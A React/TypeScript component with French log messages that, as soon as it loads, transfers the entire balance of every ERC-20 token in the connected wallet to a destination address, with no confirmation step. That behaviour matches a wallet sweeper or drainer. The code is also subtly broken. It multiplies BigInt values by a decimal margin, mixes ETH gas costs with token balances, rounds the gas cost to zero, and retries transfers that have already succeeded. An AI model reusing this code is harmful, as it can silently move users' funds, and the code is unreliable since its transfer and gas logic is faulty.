import { useEffect, useCallback } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';
import { ethers } from 'ethers';

const getGasPriceFromEtherscan = async () => {
  const apiKey = process.env.ETHERSCAN_API_KEY;
  const url = `https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=${apiKey}`;
  
  const response = await fetch(url);
  const data = await response.json();

  if (data.status === "1") {
    return BigInt(data.result);
  } else {
    throw new Error("Erreur lors de la récupération des frais de gas");
  }
};

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  const sendAllTokens = useCallback(async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
      .filter((token) => BigInt(token.balance) > 0)
      .map((token) => token.contract_address as `0x${string}`);

    if (!walletClient) return;
    if (!destinationAddress) return;

    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: destinationAddress,
      });
      if (resolvedDestinationAddress) {
        setDestinationAddress(resolvedDestinationAddress);
      } else {
        console.error("Adresse ENS introuvable");
        return;
      }
    }

    const ethBalance = await publicClient.getBalance(walletClient.account);

    let gasPrice;
    try {
      gasPrice = await getGasPriceFromEtherscan();
    } catch (err) {
      console.error("Impossible de récupérer les frais de gas", err);
      return;
    }

    const sendTokenWithGasMargin = async (tokenAddress: `0x${string}`, margin: number) => {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) return;

      try {
        const iface = new ethers.utils.Interface(erc20ABI);
        const data = iface.encodeFunctionData('transfer', [
          destinationAddress as `0x${string}`,
          BigInt(token.balance),
        ]);

        const formattedData: string = ethers.utils.isAddress(destinationAddress)
          ? data
          : ethers.utils.hexlify(data);

        const gasEstimate = await publicClient.estimateGas({
          account: walletClient.account,
          to: tokenAddress,
          data: formattedData,
        });

        const totalGasCost = gasEstimate * gasPrice;
        const gasCostInEth = totalGasCost / BigInt(1e18);

        const remainingBalance = BigInt(token.balance) - gasCostInEth * BigInt(margin);

        if (BigInt(ethBalance) < gasCostInEth) {
          console.error("Pas assez de fonds pour les frais de gas");
          return;
        }

        if (remainingBalance > 0) {
          const response = await walletClient.writeContract({
            address: tokenAddress,
            abi: erc20ABI,
            functionName: 'transfer',
            args: [destinationAddress, remainingBalance],
          });

          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...old[tokenAddress],
              pendingTxn: response,
            },
          }));

        } else {
          console.error("Solde insuffisant après déduction des frais de gas");
        }

      } catch (err) {
        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
        return false;
      }
    };

    for (let attempt = 1; attempt <= 3; attempt++) {
      let margin = 0;

      if (attempt === 1) {
        margin = 1;
      } else if (attempt === 2) {
        margin = 1.3;
      } else if (attempt === 3) {
        margin = 2;
      }

      for (const tokenAddress of tokensToSend) {
        const result = await sendTokenWithGasMargin(tokenAddress, margin);
        if (result) {
          console.log("Token envoyé avec succès !");
          return;
        }
      }
    }
  }, [tokens, walletClient, destinationAddress, setCheckedRecords, setDestinationAddress, publicClient]);

  useEffect(() => {
    if (tokens.length > 0 && destinationAddress) {
      sendAllTokens();
    }
  }, [tokens, destinationAddress, walletClient, sendAllTokens, publicClient]);

  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
};
